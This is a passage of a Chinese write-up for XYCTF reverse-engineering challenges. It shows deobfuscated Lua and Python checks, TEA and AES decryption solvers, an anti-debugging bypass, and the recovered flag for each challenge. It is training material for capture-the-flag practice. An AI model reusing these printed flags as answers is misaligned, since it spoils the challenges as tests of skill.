this"></a>what’s this</h4><p>是lua的字节码，放到在线解码里面解码，接出来就是正常的lua代码，</p><p>前面是一堆混淆的函数，最后是真的代码，大概是这个</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Xor</span><span class="params">(num1, num2)</span></span></span><br><span class="line">  <span class="keyword">local</span> tmp1 = num1</span><br><span class="line">  <span class="keyword">local</span> tmp2 = num2</span><br><span class="line">  <span class="keyword">local</span> str = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">repeat</span></span><br><span class="line">    <span class="keyword">local</span> s1 = tmp1 % <span class="number">2</span></span><br><span class="line">    <span class="keyword">local</span> s2 = tmp2 % <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> s1 == s2 <span class="keyword">then</span></span><br><span class="line">      str = <span class="string">&quot;0&quot;</span> .. str</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      str = <span class="string">&quot;1&quot;</span> .. str</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tmp1 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp1 / <span class="number">2</span>)</span><br><span class="line">    tmp2 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp2 / <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">until</span> tmp1 == <span class="number">0</span> <span class="keyword">and</span> tmp2 == <span class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">tonumber</span>(str, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">output</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">local</span> temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(flag, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(Xor(temp, <span class="number">8</span>) % <span class="number">256</span>)</span><br><span class="line">  value = value .. temp</span><br><span class="line">  i = i + <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> i &gt; <span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">1000</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">3</span></span><br><span class="line">  y = x * <span class="number">3</span></span><br><span class="line">  z = y / <span class="number">4</span></span><br><span class="line">  w = z - <span class="number">5</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">do</span></span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(value, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(temp + <span class="number">3</span>)</span><br><span class="line">  <span class="built_in">output</span> = <span class="built_in">output</span> .. temp</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">result = <span class="built_in">output</span>:<span class="built_in">rep</span>(<span class="number">10</span>)</span><br><span class="line">invalid_list = &#123;</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="number">2</span>,</span><br><span class="line">  <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">20</span> <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">table</span>.<span class="built_in">insert</span>(invalid_list, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">50</span> <span class="keyword">do</span></span><br><span class="line">  result = result .. <span class="string">&quot;A&quot;</span></span><br><span class="line">  <span class="built_in">table</span>.<span class="built_in">insert</span>(invalid_list, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(<span class="built_in">output</span>) <span class="keyword">do</span></span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(<span class="built_in">output</span>, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(temp - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">30</span> <span class="keyword">do</span></span><br><span class="line">  result = result .. <span class="built_in">string</span>.<span class="built_in">lower</span>(<span class="built_in">output</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">950</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">3</span></span><br><span class="line">  y = x * <span class="number">3</span></span><br><span class="line">  z = y / <span class="number">4</span></span><br><span class="line">  w = z - <span class="number">5</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">50</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">-1</span></span><br><span class="line">  y = x * <span class="number">4</span></span><br><span class="line">  z = y / <span class="number">2</span></span><br><span class="line">  w = z - <span class="number">3</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will also never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">obfuscated_output = to_base64(<span class="built_in">output</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">reverse</span>(obfuscated_output)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">invalid_variable = obfuscated_output:<span class="built_in">rep</span>(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> obfuscated_output == <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span> <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;You get the flag.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;F**k!&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下是base64加换字加一些奇怪的加密，那丢给chatgpt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Xor</span>(<span class="params">num1, num2</span>):</span><br><span class="line">    <span class="keyword">return</span> num1 ^ num2</span><br><span class="line"></span><br><span class="line">obfuscated_output = <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span></span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;g&quot;</span>).replace(<span class="string">&quot;4&quot;</span>, <span class="string">&quot;H&quot;</span>).replace(<span class="string">&quot;6&quot;</span>, <span class="string">&quot;W&quot;</span>)[::-<span class="number">1</span>]</span><br><span class="line">output = base64.b64decode(obfuscated_output).decode()</span><br><span class="line"></span><br><span class="line">value = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> output:</span><br><span class="line">    temp = <span class="built_in">ord</span>(char) - <span class="number">3</span></span><br><span class="line">    value += <span class="built_in">chr</span>(temp)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> value:</span><br><span class="line">    temp = Xor(<span class="built_in">ord</span>(char), <span class="number">8</span>) % <span class="number">256</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(temp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;5dcbaed781363fbfb7d8647c1aee6c&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ez-math"><a href="#ez-math" class="headerlink" title="ez_math"></a>ez_math</h4><p>是python的混淆，还没有工具，用美化工具美化一下，还是可以理解，大概就是把a*b sum了一下，最后再化简一手</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">32</span> <span class="keyword">and</span> (</span><br><span class="line">    (flag[<span class="number">0</span>] * (flag[<span class="number">0</span>] - <span class="number">176</span>)) +</span><br><span class="line">    (flag[<span class="number">1</span>] * (flag[<span class="number">1</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">2</span>] * (flag[<span class="number">2</span>] - <span class="number">134</span>)) +</span><br><span class="line">    (flag[<span class="number">3</span>] * (flag[<span class="number">3</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">4</span>] * (flag[<span class="number">4</span>] - <span class="number">140</span>)) +</span><br><span class="line">    (flag[<span class="number">5</span>] * (flag[<span class="number">5</span>] - <span class="number">246</span>)) +</span><br><span class="line">    (flag[<span class="number">6</span>] * (flag[<span class="number">6</span>] - <span class="number">226</span>)) +</span><br><span class="line">    (flag[<span class="number">7</span>] * (flag[<span class="number">7</span>] - <span class="number">110</span>)) +</span><br><span class="line">    (flag[<span class="number">8</span>] * (flag[<span class="number">8</span>] - <span class="number">174</span>)) +</span><br><span class="line">    (flag[<span class="number">9</span>] * (flag[<span class="number">9</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">10</span>] * (flag[<span class="number">10</span>] - <span class="number">142</span>)) +</span><br><span class="line">    (flag[<span class="number">11</span>] * (flag[<span class="number">11</span>] - <span class="number">230</span>)) +</span><br><span class="line">    (flag[<span class="number">12</span>] * (flag[<span class="number">12</span>] - <span class="number">198</span>)) +</span><br><span class="line">    (flag[<span class="number">13</span>] * (flag[<span class="number">13</span>] - <span class="number">170</span>)) +</span><br><span class="line">    (flag[<span class="number">14</span>] * (flag[<span class="number">14</span>] - <span class="number">234</span>)) +</span><br><span class="line">    (flag[<span class="number">15</span>] * (flag[<span class="number">15</span>] - <span class="number">224</span>)) +</span><br><span class="line">    (flag[<span class="number">16</span>] * (flag[<span class="number">16</span>] - <span class="number">232</span>)) +</span><br><span class="line">    (flag[<span class="number">17</span>] * (flag[<span class="number">17</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">18</span>] * (flag[<span class="number">18</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">19</span>] * (flag[<span class="number">19</span>] - <span class="number">176</span>)) +</span><br><span class="line">    (flag[<span class="number">20</span>] * (flag[<span class="number">20</span>] - <span class="number">212</span>)) +</span><br><span class="line">    (flag[<span class="number">21</span>] * (flag[<span class="number">21</span>] - <span class="number">220</span>)) +</span><br><span class="line">    (flag[<span class="number">22</span>] * (flag[<span class="number">22</span>] - <span class="number">212</span>)) +</span><br><span class="line">    (flag[<span class="number">23</span>] * (flag[<span class="number">23</span>] - <span class="number">150</span>)) +</span><br><span class="line">    (flag[<span class="number">24</span>] * (flag[<span class="number">24</span>] - <span class="number">222</span>)) +</span><br><span class="line">    (flag[<span class="number">25</span>] * (flag[<span class="number">25</span>] - <span class="number">242</span>)) +</span><br><span class="line">    (flag[<span class="number">26</span>] * (flag[<span class="number">26</span>] - <span class="number">170</span>)) +</span><br><span class="line">    (flag[<span class="number">27</span>] * (flag[<span class="number">27</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">28</span>] * (flag[<span class="number">28</span>] - <span class="number">150</span>)) +</span><br><span class="line">    (flag[<span class="number">29</span>] * (flag[<span class="number">29</span>] - <span class="number">232</span>)) +</span><br><span class="line">    (flag[<span class="number">30</span>] * (flag[<span class="number">30</span>] - <span class="number">142</span>)) +</span><br><span class="line">    (flag[<span class="number">31</span>] * (flag[<span class="number">31</span>] - <span class="number">250</span>)) + <span class="number">297412</span> == <span class="number">0</span></span><br><span class="line">):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过观察可以发现，每一行后面减的数除以二就是flag</p><p>那就直接除以二</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;q7WYGscUuptTYXjnjKoyUTKtG&#125;</span></span><br></pre></td></tr></table></figure><h4 id="给阿姨倒一杯卡布奇诺"><a href="#给阿姨倒一杯卡布奇诺" class="headerlink" title="给阿姨倒一杯卡布奇诺"></a>给阿姨倒一杯卡布奇诺</h4><p>是一个简单的tea，魔改的部分是一开始的data1和data2的异或</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> i;</span><br><span class="line"><span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">data1 ^= *v;</span><br><span class="line">data2 ^= v[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum += <span class="number">1853174124</span>;</span><br><span class="line">data1 += ((data2 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (data2 + sum) ^ (*k + <span class="number">16</span> * data2) ^ (sum + i);</span><br><span class="line">data2 += ((data1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (data1 + sum) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * data1) ^ (sum + i);</span><br><span class="line">&#125;</span><br><span class="line">*v = data1;</span><br><span class="line">v[<span class="number">1</span>] = data2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个还是相当于把传入当key，data1和2更像是加密的值，要解密直接在最后异或上前一个的最后值就出来了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">uint32_t</span> sum = <span class="number">0x6E75316C</span> * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">data1 = *v;</span><br><span class="line">data2 = v[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0x1f</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">data2 -= ((data1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (data1 + sum) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * data1) ^ (sum + i);</span><br><span class="line">data1 -= ((data2 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (data2 + sum) ^ (*k + <span class="number">16</span> * data2) ^ (sum + i);</span><br><span class="line">sum -= <span class="number">0x6E75316C</span>;</span><br><span class="line">&#125;</span><br><span class="line">*v = *(v - <span class="number">2</span>) ^ data1;</span><br><span class="line">v[<span class="number">1</span>] = *(v - <span class="number">1</span>) ^ data2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要注意i要是反着的，因为加密的时候用了i</p><p>出来是</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">62333331</span></span><br><span class="line"><span class="number">34656666</span></span><br><span class="line"><span class="number">32643130</span></span><br><span class="line"><span class="number">30613332</span></span><br><span class="line"><span class="number">35383332</span></span><br><span class="line"><span class="number">63303964</span></span><br><span class="line"><span class="number">63316635</span></span><br><span class="line"><span class="number">37373361</span></span><br></pre></td></tr></table></figure><p>转成字符再用xyctf包起来(题目说的是flag{}但是试了不行)：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">133</span>bffe401d223a02385d90c5f1ca377&#125;</span><br></pre></td></tr></table></figure><h4 id="easy-language"><a href="#easy-language" class="headerlink" title="easy language"></a>easy language</h4><p>这个题好坑啊！！QAQ</p><p>先通过e-decompliner插件找到主要目的地</p><p>可以看到是aes</p><p>最后的判断是</p><p><img src="https://s2.loli.net/2024/04/18/LKfxNsRWCpMVqkP.png" alt="image-20240418095501581"></p><p>根据signseacher扫描结果，发现有反调试，通过附加调试跳过</p><p>在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v5 = 字节集比较((_BYTE *)byte_59D0F4 + <span class="number">8</span>, encoded, v3);</span><br></pre></td></tr></table></figure><p>得到byte_59D0F4中的值即正确的密文，</p><p>在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mode = <span class="string">&quot;AES-ECB&quot;</span>;</span><br><span class="line"> v9 = sub_401975((<span class="type">int</span> *)&amp;checknum, (_DWORD **)&amp;key, (<span class="type">char</span> **)&amp;mode, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, &amp;v11, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>中得到key</p><p>丢进在线工具解密aes</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RZy/zVEWMFxaCbzChAg<span class="number">8</span><span class="keyword">x</span><span class="number">26</span>XZYr<span class="number">51</span>rNVnM+zBoBp<span class="number">3</span>gya<span class="number">93</span>L<span class="number">9</span>QQXpFRin<span class="number">1</span>JE<span class="number">33</span>vyx</span><br><span class="line">welcometoxyctf!!</span><br><span class="line">XYCTF&#123;y<span class="number">0</span>u_<span class="title">@r3_v3ry_g00d_a7_E_l</span><span class="title">@ngu</span><span class="title">@ge</span>&#125;</span><br></pre></td></tr></table></figure><p>总结一下：如果遇到奇怪的字符串，像是部分不对的，以及有fake_flag可能有反调试</p><h4 id="馒头"><a href="#馒头" class="headerlink" title="馒头"></a>馒头</h4><p>数据结构，直接按ans1把树画出来，直接画就好，</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;xaf1svut7rojh3de0&#125;</span></span><br></pre></td></tr></table></figure><h3 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h3><h4 id="find-me"><a href="#find-me" class="headerlink" title="find_me"></a>find_me</h4><p>一共有三个文件，只有4号是可执行文件，打开分析，发现是把3号加密成1号，那么尝试还原3号，注意其中使用了rand，所以应该写c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">FILE* inputFile, * outputFile;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">512</span>] = &#123; <span class="number">0xF3</span>, <span class="number">0x75</span>, <span class="number">0xC9</span>, <span class="number">0xB4</span>, <span class="number">0x2A</span>, <span class="number">0x3A</span>, <span class="number">0x9A</span>, <span class="number">0x90</span>, <span class="number">0xBE</span>, <span class="number">0x43</span>, <span class="number">0x65</span>, <span class="number">0x33</span>, <span class="number">0x39</span>, <span class="number">0xD3</span>, <span class="number">0xF0</span>, <span class="number">0x46</span>, <span class="number">0xA5</span>, <span class="number">0x32</span>, <span class="number">0xCE</span>, <span class="number">0x4B</span>, <span class="number">0x8A</span>, <span class="number">0x6C</span>, <span class="number">0x60</span>, <span class="number">0xC7</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0xEF</span>, <span class="number">0x96</span>, <span class="number">0xB2</span>, <span class="number">0x08</span>, <span class="number">0xC7</span>, <span class="number">0x68</span>, <span class="number">0x53</span>, <span class="number">0x6E</span>, <span class="number">0xD9</span>, <span class="number">0x0D</span>, <span class="number">0xD4</span>, <span class="number">0x69</span>, <span class="number">0xCD</span>, <span class="number">0x87</span>, <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0xE9</span>, <span class="number">0x93</span>, <span class="number">0x7B</span>, <span class="number">0x21</span>, <span class="number">0x65</span>, <span class="number">0xDE</span>, <span class="number">0x8E</span>, <span class="number">0x24</span>, <span class="number">0x26</span>, <span class="number">0xA6</span>, <span class="number">0xC8</span>, <span class="number">0x94</span>, <span class="number">0x7E</span>, <span class="number">0xFD</span>, <span class="number">0x4F</span>, <span class="number">0xFD</span>, <span class="number">0xAD</span>, <span class="number">0x2B</span>, <span class="number">0x51</span>, <span class="number">0x28</span>, <span class="number">0x0A</span>, <span class="number">0x5C</span>, <span class="number">0xA1</span>, <span class="number">0x0E</span>, <span class="number">0x11</span>, <span class="number">0x45</span>, <span class="number">0x25</span>, <span class="number">0x6D</span>, <span class="number">0x6B</span>, <span class="number">0x9F</span>, <span class="number">0x75</span>, <span class="number">0x5D</span>, <span class="number">0x3E</span>, <span class="number">0x20</span>, <span class="number">0xFA</span>, <span class="number">0xDC</span>, <span class="number">0x07</span>, <span class="number">0xA3</span>, <span class="number">0x77</span>, <span class="number">0xC6</span>, <span class="number">0x8C</span>, <span class="number">0xEC</span>, <span class="number">0x8B</span>, <span class="number">0x3C</span>, <span class="number">0xCE</span>, <span class="number">0x2D</span>, <span class="number">0x18</span>, <span class="number">0xE3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>, <span class="number">0xBC</span>, <span class="number">0xCA</span>, <span class="number">0xB7</span>, <span class="number">0xB4</span>, <span class="number">0x03</span>, <span class="number">0x5B</span>, <span class="number">0xF0</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0xF2</span>, <span class="number">0x3B</span>, <span class="number">0x34</span>, <span class="number">0x42</span>, <span class="number">0xB3</span>, <span class="number">0x39</span>, <span class="number">0x91</span>, <span class="number">0x67</span>, <span class="number">0x23</span>, <span class="number">0x16</span>, <span class="number">0xEA</span>, <span class="number">0x88</span>, <span class="number">0x05</span>, <span class="number">0x08</span>, <span class="number">0x19</span>, <span class="number">0xDA</span>, <span class="number">0xDF</span>, <span class="number">0xD0</span>, <span class="number">0xF5</span>, <span class="number">0x09</span>, <span class="number">0x23</span>, <span class="number">0x59</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x13</span>, <span class="number">0x85</span>, <span class="number">0xBD</span>, 